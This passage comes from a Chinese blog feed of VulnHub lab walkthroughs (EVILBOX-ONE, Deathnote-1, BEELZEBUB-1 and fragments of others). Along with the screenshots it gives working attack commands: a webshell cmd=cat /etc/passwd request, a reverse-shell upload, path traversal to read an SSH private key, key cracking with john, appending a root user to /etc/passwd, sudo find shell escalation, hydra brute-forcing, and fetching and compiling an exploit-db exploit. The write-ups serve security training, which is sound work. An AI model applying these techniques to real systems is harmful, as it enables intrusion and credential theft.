class="number">4</span>: Now go to example.com/data/<span class="number">1048576</span>/<span class="string">&quot;document_id&quot;</span>/<span class="number">1.</span>php?cmd=cat+/etc/passwd to get the command response <span class="keyword">in</span> browser.</span><br><span class="line"></span><br><span class="line">Note: Here <span class="string">&quot;data&quot;</span> <span class="keyword">and</span> <span class="string">&quot;1048576&quot;</span> are default folders where the uploaded files are getting saved.</span><br></pre></td></tr></table></figure><p>步骤1，2：就是登录，然后上传一个文档，我们已经上传完成了例子用的是一个webshell，我们上传的是反弹shell，我们需要找到上传文件的位置</p><p>步骤3：查看文档的id，我们通过刚刚上传的反弹php序号为12</p><p><img src="Untitled%2023.png" alt="Untitled"></p><p>步骤4：访问<code>/data/1048576/&quot;document_id&quot;/1.php</code> 页面，在那之前先开启msf的监听，然后访问<code>1.php</code></p><p><img src="Untitled%2024.png" alt="Untitled"></p><p>反弹成功</p><p><img src="Untitled%2025.png" alt="Untitled"></p><h2 id="提升权限："><a href="#提升权限：" class="headerlink" title="提升权限："></a>提升权限：</h2><p>我们查看<code>/home</code>页面发现存在用户<code>saket</code></p><p>我们之前有在数据库中发现过<code>saket</code>，他的密码是<code>Saket@#$1337</code>  我们登陆试试，登录成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure><p><img src="Untitled%2026.png" alt="Untitled"></p><p>使用<code>sudo -l</code> 查看此用户可以以<code>root</code>权限执行的命令，发现是<code>(ALL : ALL) ALL</code></p><p><img src="Untitled%2027.png" alt="Untitled"></p><p>那就自由发挥吧，这里使用<code>find</code>提权，成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -<span class="built_in">exec</span> /<span class="built_in">bin</span>/bash \;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2028.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』EVILBOX-ONE</title>
      <link href="/2024/05/28/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FEVILBOX-ONE/"/>
      <url>/2024/05/28/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FEVILBOX-ONE/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』EVILBOX-ONE"><a href="#『vulnhub系列』EVILBOX-ONE" class="headerlink" title="『vulnhub系列』EVILBOX-ONE"></a>『vulnhub系列』EVILBOX-ONE</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/evilbox-one,<span class="number">736</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>使用nmap探测内网存活主机，发现开启了22 和 80端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口web服务，发现apache默认页面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch进行目录爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.131&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问<code>/robots.txt</code>发现一句话，<code>H4x0r</code> 可能是用户名或密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello H4x0r</span><br></pre></td></tr></table></figure><p>访问<code>/secret/</code> 发现是空白，我们来扫描这个目录，发现没有结果</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>我们可以尝试换个工具和字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u <span class="string">&quot;http://192.168.0.131/secret/&quot;</span> -w /usr/share/wordlists/dirb/big.txt -x .php</span><br></pre></td></tr></table></figure><ul><li>-u 目标url</li><li>-w wordlist字典</li><li>-x 文件后缀</li></ul><p><img src="Untitled%204.png" alt="Untitled"></p><p>不知道为什么使用dirb用同样的字典和指定php爆破不出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -e php -w /usr/share/wordlists/dirb/big.txt -u <span class="string">&quot;http://192.168.0.131/secret/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p>最后发现evli.php，但是发现页面还是空的</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>接下来使用工具ffuf进行爆破参数，最后得到参数为<code>command</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u <span class="string">&#x27;http://192.168.0.131/secret/evil.php?FUZZ=../../../../etc/passwd&#x27;</span> -w <span class="string">&quot;/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&quot;</span> -fs <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>-fs 0 过滤大小为0</li><li>FUZZ为字典爆破字段</li><li>../../../../etc/passwd因为不确定是命令执行还是任意文件读取，可以用随意命令爆破，和足够多的../../../。。。。/etc/passwd来确定</li></ul><p><img src="Untitled%207.png" alt="Untitled"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>因为刚刚那个，可能是密码，所以我们正好读取<code>/etc/passwd</code></p><p><img src="Untitled%208.png" alt="Untitled"></p><p>查看页面源代码，可以换行，发现用户名为<code>mowree</code></p><p><img src="Untitled%209.png" alt="Untitled"></p><p>使用<code>mowree</code>来登录<code>H4x0r</code> 为密码，发现登录失败，看来没这么简单，继续使用任意文件读取</p><p>众所周知，我们除了使用密码登录ssh以外，还可以使用证书，而证书的私钥一般储存的位置</p><p>为<code>/home/xxx/.ssh/id_rsa</code>中<code>xxx</code> 为用户名，我们使用任意文件读取发现确实存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command=../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p><img src="Untitled%2010.png" alt="Untitled"></p><p>拷贝下来，使用ssh2john工具将<code>id_rsa</code>转化为john可以是识别的<code>hash</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt; <span class="built_in">hash</span> <span class="comment">#将hash值输出到hash文件中</span></span><br></pre></td></tr></table></figure><p>再使用john来破解密码，得到密码<code>unicorn</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt <span class="comment">#使用wordlist（字典）破解，这里的字典是</span></span><br><span class="line"><span class="comment">#/usr/share/wordlists/里的rockyou需要解压一下</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>此时使用私钥登录，结果发现有警告，并且需要输入<code>mowree</code>的密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa mowree@<span class="number">192.168</span><span class="number">.0</span><span class="number">.131</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2012.png" alt="Untitled"></p><p>原因是，id_rsa的默认权限为700，所以会出现告警。因此我们将id_rsa的权限修改为700</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> id_rsa</span><br></pre></td></tr></table></figure><p>此时登录，输入<code>unicorn</code> 即可登陆成功</p><p><img src="Untitled%2013.png" alt="Untitled"></p><h2 id="提升权限：（passwd提权）"><a href="#提升权限：（passwd提权）" class="headerlink" title="提升权限：（passwd提权）"></a>提升权限：（passwd提权）</h2><p>查看所有既有SUID权限的文件，没有发现异常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><p>使用命令查看用户可以以root权限运行的命令,发现没有这个命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="Untitled%2015.png" alt="Untitled"></p><p>最后发现此用户对<code>/etc/passwd</code>具有写权限，那么这里就可以使用passwd提权</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>拿root在passwd中的条目依次来看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure><ul><li>root：用户名</li><li>x：有密码，本来是放加密后的密码的，但后来都放入shadow中了，但也依旧支持此处是加密后的密码</li><li>0：用户UID为0</li><li>0：用户组GID为0</li><li>root：用户备注信息</li><li>/root：用户home目录</li><li>/bin/bash：用户默认的bash</li></ul><p>因此，现在我们在对passwd有写权限后，我们完全构造一个类似的root用户，我们个给passwd追加一个用户,那么现在首要就是生成一个加密后的密码（加盐值），这里使用pyhton来生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import crypt;print(crypt.crypt(&quot;123456&quot;,&quot;addsalt&quot;))&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成加盐值的密码</span></span><br><span class="line">adrla7IBSfTZQ</span><br></pre></td></tr></table></figure><p>现在我们来构造一个用户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:adrla7IBSfTZQ:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure><p>然后追加到passwd中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure><p>查看一下发现添加成功</p><p><img src="Untitled%2017.png" alt="Untitled"></p><p>我们此时切换为test用户看一下，获得root权限</p><p><img src="Untitled%2018.png" alt="Untitled"></p><h2 id="成果："><a href="#成果：" class="headerlink" title="成果："></a>成果：</h2><p>登录<code>mowree</code>用户后在目录下发现<code>user.txt</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br></pre></td></tr></table></figure><p>获得root权限后，在其目录下发现root.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』Deathnote-1</title>
      <link href="/2024/05/27/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FDeathnote-1/"/>
      <url>/2024/05/27/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FDeathnote-1/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』Deathnote-1"><a href="#『vulnhub系列』Deathnote-1" class="headerlink" title="『vulnhub系列』Deathnote-1"></a>『vulnhub系列』Deathnote-1</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/deathnote-<span class="number">1</span>,<span class="number">739</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>使用nmap扫描存活主机，发现主机开启了22端口和80端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口的web服务，发现apache默认页面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用<code>dirsearch</code> 进行目录扫描</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.130&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问robot.txt,说提示就在<code>/important.jpg</code> 中</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>访问<code>/important.jpg</code> 页面，发现没有东西，查看源码，意思是我们需要的用户名在<code>user.txt</code>中，暂时还找不到<code>user.txt</code> 先按下不表</p><p><img src="Untitled%204.png" alt="Untitled"></p><p>我们访问wordpress页面，发现网页访问有问题</p><p><img src="Untitled%205.png" alt="Untitled"></p><p>查看源代码，发现其跳转是使用的域名，我们在攻击机上将<code>deathnote.vuln</code>解析到ip地址</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>这里使用windows访问的网站，所以在windows中修改host(<code>C:\Windows\System32\drivers\etc\hosts</code>)文件,添加一条解析记录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span> deathnote.vuln</span><br></pre></td></tr></table></figure><p>再次访问页面，正常了（看夜神月的帅脸）</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>发现一个可疑的字符串，可能是密码<strong><code>iamjustic3</code></strong></p><p><img src="Untitled%208.png" alt="Untitled"></p><p>用户名可能是<code>kira</code> 使用<code>wpscan</code>查看一下，发现用户名确实有kira</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url=http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span>/wordpress --force -e --plugins-detection aggressive</span><br></pre></td></tr></table></figure><p><img src="Untitled%209.png" alt="Untitled"></p><p>使用<code>kira</code>和<strong><code>iamjustic3</code></strong> 登录ssh试试，失败</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>我们继续信息搜集，发现主页有一个<code>HINT</code>点击查看，说是要找到<code>notes.txt</code>或者看L的评论</p><p><img src="Untitled%2011.png" alt="Untitled"></p><p>结果在这个页面是看不到L的评论的，那还有哪里可以看呢？没错就是后台</p><p>我们还扫描到了一个登录页面，使用<strong><code>kira</code></strong>和<strong><code>iamjustic3</code></strong> 进行登录</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>登录成功</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>发现可以发博客，我们发一篇博客可以上传文件</p><p><img src="Untitled%2014.png" alt="Untitled"></p><p>发现上传不了php，但在上传文件旁边，我们看到了一个媒体库，点开</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>发现了<code>notes.txt</code> ,然后我们回到管理页面，进入媒体库，查看<code>notes.txt</code> </p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>点击可以看到文件位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://deathnote.vuln/wordpress/wp-content/uploads/<span class="number">2021</span>/07/notes.txt</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><p>访问，我们发现这应该是一个字典，我们保存到<code>pass.txt</code></p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>我们使用<code>hydra</code>进行暴力破解，使用用户名<code>kira</code> 爆破失败</p><p><img src="Untitled%2019.png" alt="Untitled"></p><p>可能是用户名有问题，突然想起来在第一个提示里说用户名在<code>user.txt</code>中，我们回到发现<code>notes.txt</code> 的目录下，看看是否有<code>user.txt</code> ，结果是确实有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://deathnote.vuln/wordpress/wp-content/uploads/<span class="number">2021</span>/07/</span><br></pre></td></tr></table></figure><p><img src="Untitled%2020.png" alt="Untitled"></p><p>我们保存下来到<code>user.txt</code>文件中，此时使用<code>user.txt</code>和<code>pass.txt</code>进行爆破，成功找到一个</p><p>用户名：密码 <code>l:death4me</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P <span class="keyword">pass</span>.txt ssh://<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2021.png" alt="Untitled"></p><p>我们使用l的账号进行登录，成功</p><p><img src="Untitled%2022.png" alt="Untitled"></p><p>我们到处乱逛，终于在/opt目录下发现L目录</p><p><img src="Untitled%2023.png" alt="Untitled"></p><p>进入L目录，发现两个文件夹一个是<code>kira-case</code>和<code>fake-notebook-rule</code>（假的死亡笔记规则）</p><p><img src="Untitled%2024.png" alt="Untitled"></p><p>先进入<code>kira-case</code>查看，说有一些东西在<code>fake-notebook-rule</code> 文件夹下</p><p><img src="Untitled%2025.png" alt="Untitled"></p><p>在<code>fake-notebook-rule</code> 中找到两个文件，在hint中得知需要用到<code>cyberchef</code></p><p><img src="Untitled%2026.png" alt="Untitled"></p><p>那么另一个文件就是用来解密的了<code>cat case.wav</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">63</span> <span class="number">47</span> <span class="number">46</span> 7a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> 6b <span class="number">49</span> <span class="number">44</span> 6f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> 6c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> 6c 7a 5a <span class="number">58</span> 5a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> 3d</span><br></pre></td></tr></table></figure><p>我们下载<code>cyberchef</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gchq/CyberChef/releases/tag/v10<span class="number">.18</span><span class="number">.6</span></span><br></pre></td></tr></table></figure><p>之后直接点开html，进行解密，得到密码：（其实是使用了16进制+base64进行了混合加密，直接解密即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd : kiraisevil </span><br></pre></td></tr></table></figure><p><img src="Untitled%2027.png" alt="Untitled"></p><p>切换为kira用户<code>su kira</code> ,成功</p><p><img src="Untitled%2028.png" alt="Untitled"></p><p>使用<code>sudo -l</code> 查看用户可以以root权限运行的命令，发现是<code>(ALL : ALL) ALL</code></p><p><img src="Untitled%2029.png" alt="Untitled"></p><p>那接下来就可以随意发挥了，这里使用find提权，成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -<span class="built_in">exec</span> /<span class="built_in">bin</span>/bash \;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2030.png" alt="Untitled"></p><h2 id="成果："><a href="#成果：" class="headerlink" title="成果："></a>成果：</h2><p>在使用l成功登录之后，在其目录下获得user.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.&lt;&lt;++.&gt;&gt;+++++++++++.------------.+.+++++.---.&lt;&lt;.&gt;&gt;++++++++++.&lt;&lt;.&gt;&gt;--------------.++++++++.+++++.&lt;&lt;.&gt;&gt;.------------.---.&lt;&lt;.&gt;&gt;++++++++++++++.-----------.---.+++++++..&lt;&lt;.++++++++++++.------------.&gt;&gt;----------.+++++++++++++++++++.-.&lt;&lt;.&gt;&gt;+++++.----------.++++++.&lt;&lt;.&gt;&gt;++.--------.-.++++++.&lt;&lt;.&gt;&gt;------------------.+++.&lt;&lt;.&gt;&gt;----.+.++++++++++.-------.&lt;&lt;.&gt;&gt;+++++++++++++++.-----.&lt;&lt;.&gt;&gt;----.--.+++..&lt;&lt;.&gt;&gt;+.--------.&lt;&lt;.+++++++++++++.&gt;&gt;++++++.--.+++++++++.-----------------.</span><br></pre></td></tr></table></figure><p>使用brianfuck解密，得到kira的留言</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i think u got the shell , but you wont be able to kill me -kira</span><br></pre></td></tr></table></figure><p><img src="Untitled%2031.png" alt="Untitled"></p><p>在kira目录下也有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp</span><br></pre></td></tr></table></figure><p>最后的root目录下，也有</p><p><img src="Untitled%2032.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』BEELZEBUB- 1</title>
      <link href="/2024/05/27/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FBEELZEBUB-%201/"/>
      <url>/2024/05/27/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FBEELZEBUB-%201/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』BEELZEBUB-1"><a href="#『vulnhub系列』BEELZEBUB-1" class="headerlink" title="『vulnhub系列』BEELZEBUB- 1"></a>『vulnhub系列』BEELZEBUB- 1</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/beelzebub-<span class="number">1</span>,<span class="number">742</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>使用nmap扫描存活主机，发现主机开启了22和80端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口的web服务，发现是apache的默认页面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch扫描目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.140/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>发现存在<code>phpmyadmin</code>等页面，访问<code>index.php</code>页面，发现是<code>404</code> <code>/login</code>也是一样</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>感觉有猫腻，查看一下源代码，果然发现一行提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--My heart was encrypted, <span class="string">&quot;beelzebub&quot;</span> somehow hacked <span class="keyword">and</span> decoded it.-md5--&gt;</span><br><span class="line"><span class="comment">#我的心被加密了，&quot;beelzebub&quot;不知如何被入侵了，并且被解密了 md5</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%204.png" alt="Untitled"></p><p>大概的意思是本来是被加密的，后来被用md5解密了，现在我们使用md5加密一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d18e1e22becbd915b45e0e655429d487</span><br></pre></td></tr></table></figure><p>然后当作目录扫描一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.140/d18e1e22becbd915b45e0e655429d487&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p>然后我们发现是个<code>Wordpress</code> 网站，里面有登录页面（这里靶机换了ip变为<code>192.168.0.128</code>）</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>还有一个文件上传的目录页面</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>点开<code>Talk To VALAK</code> 发现是个带有输入框的页面</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>随便输入一个数据，查看<code>cookie</code> 多出来一个<code>Password</code> 值为<code>M4k3Ad3a1</code></p><p><img src="Untitled%209.png" alt="Untitled"></p><p>因为是<code>Wordpress</code>页面，因此可以使用工具<code>wpscan</code></p><p>使用命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url=http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span>/d18e1e22becbd915b45e0e655429d487/ --ignore-main-redirect --force -e --plugins-detection aggressive</span><br></pre></td></tr></table></figure><ul><li>—ignore-main-redirect 忽略重定向扫描目标</li><li>—force 不检查是否运行wordpress</li><li>-e —enumerate 枚举，默认枚举所有插件，备份</li><li>—plugins-detection aggressive 使用提供的模式枚举插件 默认被动（passvie）可选：混合（mix）被动（passvie）主动（aggressive）</li></ul><p>扫描到用户<code>valak</code> 和<code>krampus</code> 我们使用这两个用户名和密码<code>M4k3Ad3a1</code>进行登录</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>因为wordpress页面跳转有些问题，我们使用<code>ssh</code>登录，使用<code>krampus</code>登录成功</p><p><img src="Untitled%2011.png" alt="Untitled"></p><h2 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h2><p>进入系统后，使用命令<code>ls -la</code> 发现有两个文件很可疑</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>但是<code>.sudo_as_admin_successful</code> 大小为0所以我们直接看<code>.bash_history</code>可以看到命令历史</p><p>然后我们发现有一个<code>wget</code>和<code>gcc</code>编译命令，我们照着运行</p><p><img src="Untitled%2013.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/<span class="number">47009</span></span><br><span class="line"></span><br><span class="line">mv <span class="number">47009</span> ./exploit.c</span><br><span class="line"></span><br><span class="line">gcc exploit.c -o <span class="number">1</span></span><br><span class="line"></span><br><span class="line">./<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><h2 id="成果："><a href="#成果：" class="headerlink" title="成果："></a>成果：</h2><p><img src="Untitled%2015.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』doubletrouble-1</title>
      <link href="/2024/05/23/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8Fdoubletrouble-1/"/>
      <url>/2024/05/23/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8Fdoubletrouble-1/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』doubletrouble-1"><a href="#『vulnhub系列』doubletrouble-1" class="headerlink" title="『vulnhub系列』doubletrouble-1"></a>『vulnhub系列』doubletrouble-1</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/doubletrouble-<span class="number">1</span>,<span class="number">743</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用命令，获得存活靶机IP为138，开启端口22和80</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.* <span class="comment">#因为当前NAT模式，攻击机和靶机在一个内网环境中</span></span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80的web服务，是一个登录页面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>又是qdPm，之前做过一个qdpm的题目，于是我们就知道了qdpm存在密码泄露漏洞。我们来看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 